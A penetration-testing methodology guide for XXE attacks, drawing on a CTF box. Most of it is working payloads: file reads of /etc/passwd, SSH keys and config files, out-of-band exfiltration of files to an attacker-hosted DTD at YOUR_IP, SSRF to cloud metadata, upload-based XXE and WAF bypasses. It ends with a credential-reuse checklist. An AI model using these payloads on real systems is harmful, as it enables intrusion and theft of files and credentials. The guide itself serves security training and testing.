XXE (XML External Entity) Methodology

This is your go-to reference when you suspect XXE. Think of it as a decision tree: detect it, confirm it, exploit it, escalate.

When to Test for XXE

Any time the app processes XML. This includes the obvious (SOAP APIs, XML file uploads, REST endpoints accepting application/xml) and the less obvious:

File uploads that accept SVG, DOCX, XLSX, or any Office format (these are ZIP archives containing XML files inside).

SAML authentication flows — SAML responses are XML.

Any form where the frontend builds XML and sends it (like BountyHunter did — the form looked normal but the JS converted input to XML, base64-encoded it, and sent it as a form parameter).

Always intercept with Burp and look at the raw request. If you see XML or base64 that decodes to XML, test for XXE.

Detection

Step 1: Find the XML

Look at the raw request in Burp. The XML might be:
- Raw in the POST body (Content-Type: application/xml)
- Base64-encoded inside a form parameter (Content-Type: application/x-www-form-urlencoded)
- Inside a file upload (multipart/form-data)
- URL-encoded, double-encoded, or nested

Decode everything in Burp Inspector until you find XML. Understanding HOW the XML reaches the parser is critical — you need to encode your payload the same way.

Step 2: Test entity expansion

Inject a simple internal entity to see if the parser processes entities at all:

    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY test "hello">]>
    <root>&test;</root>

If "hello" appears in the response, entities work. If not, the parser might have entities disabled, or you have the wrong XML structure/encoding.

Step 3: Match the expected XML structure

This is where BountyHunter tripped us up. The backend expects specific tag names. If you use <root> but the app parses <bugreport><title>, your entity value lands nowhere.

How to figure out the structure:
- Look at the response — field names (Title, CWE, Score) map to XML tags
- Look at the frontend JavaScript that builds the XML
- Use the php://filter trick to read the PHP source that parses the XML
- Try the original legitimate request structure with your entity injected into one of the values

In-Band XXE (Reflected)

The entity value shows up in the response. This is the easiest case.

Basic file read:

    <?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <tagname>&xxe;</tagname>

If special characters break parsing, use a PHP wrapper to base64-encode:

    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

Then decode: echo "<base64>" | base64 -d

The PHP wrapper is your best friend — it works on any file type and avoids XML parsing issues. Always try this if plain file:// gives empty results or errors.

Files to grab first:
- /etc/passwd (enumerate users with /bin/bash)
- /etc/hostname
- Application source code (db.php, config.php, wp-config.php, .env)
- /home/<user>/.ssh/id_rsa
- /proc/self/environ (may leak env vars, paths, secrets)
- Web server configs: /etc/apache2/sites-enabled/000-default.conf, /etc/nginx/nginx.conf

Windows targets:
- C:\windows\win.ini
- C:\inetpub\wwwroot\web.config
- C:\windows\system32\drivers\etc\hosts

Blind XXE (Out-of-Band / OOB)

When the entity value is NOT reflected in the response. You exfiltrate data by making the server send it to your listener.

Host evil.dtd on your Kali (python3 -m http.server 8000):

    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8000/?data=%file;'>">
    %eval;
    %exfil;

Payload:

    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY % xxe SYSTEM "http://YOUR_IP:8000/evil.dtd">
      %xxe;
    ]>
    <root>anything</root>

Note: use parameter entities (%) not regular entities (&) in the DOCTYPE. Regular entities can only be referenced in the XML body. Parameter entities work inside the DOCTYPE and DTD.

The chain: server fetches evil.dtd → DTD reads /etc/passwd via php filter → DTD makes server request http://YOUR_IP/?data=<base64> → you decode the query string.

If no request hits your listener: the target can't make outbound HTTP connections. Fall back to error-based or stick with in-band.

Error-Based XXE

Force the parser to leak file contents in error messages:

    <?xml version="1.0"?>
    <!DOCTYPE foo [
      <!ENTITY % file SYSTEM "file:///etc/passwd">
      <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
      %eval;
      %error;
    ]>

The parser tries to open a path like /nonexistent/<contents of /etc/passwd> and the error message contains the file data. Works when you can see error output but not normal entity reflection.

SSRF via XXE

Use XXE to hit internal services:

    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
    <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

Good for: internal web apps, cloud metadata (AWS/GCP/Azure), port scanning internal hosts. But XXE SSRF only speaks HTTP(S) and file:// — you can't interact with protocols like MySQL, Redis, or SMTP directly through basic XXE.

XInclude

When you can't control the DOCTYPE (your input gets inserted into an existing XML document):

    <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>

No DOCTYPE needed. Inject this as a value in whatever field you control.

XXE via File Upload

SVG upload:

    <?xml version="1.0"?>
    <!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
      <text x="0" y="20">&xxe;</text>
    </svg>

Save as .svg and upload wherever images are accepted.

DOCX/XLSX: Unzip the file, inject XXE into [Content_Types].xml or word/document.xml, rezip, upload.

Bypass Techniques

If SYSTEM is blocked:
    <!ENTITY xxe PUBLIC "any" "file:///etc/passwd">

If file:// is blocked: try php://, expect://, data:// wrappers.

If external DTDs are blocked: use internal DTD with error-based extraction.

Encoding bypasses: try UTF-7, UTF-16 to evade WAF filters.

CDATA wrapping for problematic content:
    <![CDATA[file contents here]]>

Parameter entity trick to bypass some WAFs:
    <!ENTITY % a "<!ENTITY xxe SYSTEM 'file:///etc/passwd'>">
    %a;

Methodology Checklist (Do This Every Time)

1. Intercept the request in Burp. Find the XML — decode base64, URL-encoding, whatever layers exist.

2. Understand the encoding chain. How does the XML get from your input to the parser? You must encode your payload the same way.

3. Match the XML structure. Wrong tag names = empty responses. Check response fields, frontend JS, or read the source.

4. Test with a simple internal entity first. If &test; doesn't reflect, don't waste time on file reads.

5. Try in-band file read with php://filter/convert.base64-encode. This is the most reliable method.

6. If no reflection, try OOB with external DTD on your server.

7. If no outbound connections, try error-based extraction.

8. If you can't control DOCTYPE, try XInclude.

9. Read application source code first (db.php, config files) — credentials are the fast path to a shell.

10. Try credential reuse across SSH, FTP, databases, admin panels.

Common Mistakes

Sending raw XML when the app expects it encoded (base64, URL-encoded, inside a form parameter). Always match the original request format.

Using wrong XML tag names. The parser extracts specific elements — if your entity isn't in the right tag, it goes nowhere.

Using regular entities (&xxe;) in DOCTYPE blocks. Parameter entities (%) are needed inside DOCTYPE/DTD. Regular entities go in the XML body.

Forgetting Content-Type. application/xml vs application/x-www-form-urlencoded makes or breaks the request.

Assuming OOB works. Many boxes and real targets block outbound HTTP. Always try in-band first if possible.
